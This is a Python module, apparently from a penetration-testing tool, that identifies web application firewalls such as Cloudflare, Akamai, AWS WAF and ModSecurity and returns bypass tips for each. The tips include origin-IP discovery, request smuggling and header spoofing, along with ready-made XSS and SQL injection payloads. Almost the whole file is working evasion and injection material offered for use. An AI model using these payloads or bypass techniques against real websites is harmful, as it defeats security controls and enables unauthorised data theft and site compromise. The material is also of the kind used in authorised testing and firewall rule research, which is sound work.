"""WAF Detection & Bypass Suggestions — identify WAF and recommend bypass techniques."""

WAF_BYPASS_DB = {
    "cloudflare": {
        "name": "Cloudflare",
        "bypasses": [
            "Use origin IP directly (find via DNS history, Censys, Shodan)",
            "CloudFail tool: enumerate origin IPs via misconfigured DNS",
            "Check for subdomain bypasses (mail., direct., origin.)",
            "Try older TLS versions or unusual ciphers",
            "Unicode normalization tricks in payloads",
            "Chunk transfer encoding for request smuggling",
        ],
        "xss_bypass": [
            '<svg/onload=alert`1`>',
            '<img src=x onerror=alert(1)//',
            '"><svg/onload=&#97&#108&#101&#114&#116(1)>',
        ],
        "sqli_bypass": [
            "/*!50000UNION*/ SELECT",
            "' /*!50000OR*/ 1=1--",
            "0' div 1 union%23foo*%2F*bar%0D%0Aselect 1,2,3",
        ],
    },
    "akamai": {
        "name": "Akamai",
        "bypasses": [
            "HPP (HTTP Parameter Pollution) — duplicate parameters",
            "JSON content type with SQL in values",
            "HTTP method override headers (X-HTTP-Method-Override)",
            "Try API endpoints that may bypass WAF rules",
            "Multipart form data encoding",
        ],
        "xss_bypass": [
            '<details open ontoggle=alert(1)>',
            '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
        ],
        "sqli_bypass": [
            "' or '1'='1' /*",
            "admin'-- -",
        ],
    },
    "aws_waf": {
        "name": "AWS WAF",
        "bypasses": [
            "Case variation in SQL keywords (SeLeCt, UnIoN)",
            "URL encoding / double encoding payloads",
            "Use CRLF injection to bypass rules",
            "JSON-based payloads for SQL injection",
            "Try request smuggling via CL.TE / TE.CL",
        ],
        "xss_bypass": [
            '<img src="x" onerror="&#x61;lert(1)">',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        ],
        "sqli_bypass": [
            "' oR '1'='1",
            "-1' UnIoN SeLeCt 1,2,3-- -",
        ],
    },
    "modsecurity": {
        "name": "ModSecurity",
        "bypasses": [
            "Check CRS version — older versions have known bypasses",
            "Payload in HTTP headers (Referer, Cookie, User-Agent)",
            "Unicode/UTF-8 encoding tricks",
            "Comment injection in SQL (/**/)",
            "HPP with same parameter name multiple times",
        ],
        "xss_bypass": [
            '<body/onhashchange=alert(1)>#x',
            '<svg><set onbegin=alert(1)>',
        ],
        "sqli_bypass": [
            "1' /*!50000union*/ /*!50000select*/ 1,2,3--",
            "1' and 1=1 -- -",
        ],
    },
    "sucuri": {
        "name": "Sucuri",
        "bypasses": [
            "Find origin IP via DNS history or email headers",
            "Test non-standard ports (8080, 8443)",
            "IPv6 direct access if available",
            "Bypass via CloudFlair-style origin detection",
        ],
        "xss_bypass": [
            '<video src=x onerror=alert(1)>',
        ],
        "sqli_bypass": [
            "1'/**/union/**/select/**/1,2,3-- -",
        ],
    },
    "imperva": {
        "name": "Imperva / Incapsula",
        "bypasses": [
            "Find real IP through SSL certificate lookup",
            "Use X-Forwarded-For / X-Real-IP spoofing",
            "Tab and newline characters in SQL payloads",
            "Chunked encoding to split payloads",
        ],
        "xss_bypass": [
            '<marquee onstart=alert(1)>',
        ],
        "sqli_bypass": [
            "1'%09union%09select%091,2,3-- -",
            "1' and/**/ 1=1-- -",
        ],
    },
    "f5_bigip": {
        "name": "F5 BIG-IP ASM",
        "bypasses": [
            "Parameter pollution with encoding",
            "Use multipart/form-data content type",
            "HTTP/2 specific bypasses",
            "Content-Length manipulation",
        ],
        "xss_bypass": [],
        "sqli_bypass": [
            "1'+or+'1'%3d'1",
        ],
    },
    "fortinet": {
        "name": "Fortinet FortiWeb",
        "bypasses": [
            "URL-encoded payloads",
            "Use alternate HTTP methods (PUT, PATCH)",
            "Content type switching",
        ],
        "xss_bypass": [],
        "sqli_bypass": [],
    },
    "barracuda": {
        "name": "Barracuda WAF",
        "bypasses": [
            "Transfer-Encoding: chunked payload splitting",
            "URL path manipulation (/./admin/ etc.)",
            "Header-based payload injection",
        ],
        "xss_bypass": [],
        "sqli_bypass": [],
    },
}

# Map common WAF detection strings to our DB keys
WAF_NAME_MAP = {
    "cloudflare": "cloudflare",
    "akamai": "akamai",
    "aws": "aws_waf", "amazon": "aws_waf", "awswaf": "aws_waf",
    "modsecurity": "modsecurity", "mod_security": "modsecurity",
    "sucuri": "sucuri",
    "imperva": "imperva", "incapsula": "imperva",
    "f5": "f5_bigip", "bigip": "f5_bigip", "big-ip": "f5_bigip",
    "fortinet": "fortinet", "fortiweb": "fortinet",
    "barracuda": "barracuda",
}


def get_waf_bypass(waf_name):
    """Get bypass suggestions for a detected WAF.
    waf_name: WAF identifier string from detection
    Returns dict with name, bypasses, xss_bypass, sqli_bypass or None.
    """
    if not waf_name:
        return None

    waf_lower = waf_name.lower().strip()

    # Direct match
    if waf_lower in WAF_BYPASS_DB:
        return WAF_BYPASS_DB[waf_lower]

    # Fuzzy match via name map
    for key, db_key in WAF_NAME_MAP.items():
        if key in waf_lower:
            return WAF_BYPASS_DB[db_key]

    return {
        "name": waf_name,
        "bypasses": [
            "Try payloads in different encoding (URL, Unicode, Base64)",
            "Use HTTP Parameter Pollution (HPP)",
            "Test with different Content-Types",
            "Try request smuggling techniques",
            "Check if non-standard ports bypass the WAF",
            "Look for the origin IP behind the WAF",
        ],
        "xss_bypass": [],
        "sqli_bypass": [],
    }


def get_all_waf_info():
    """Return all WAF bypass information for reference."""
    return {k: v for k, v in WAF_BYPASS_DB.items()}
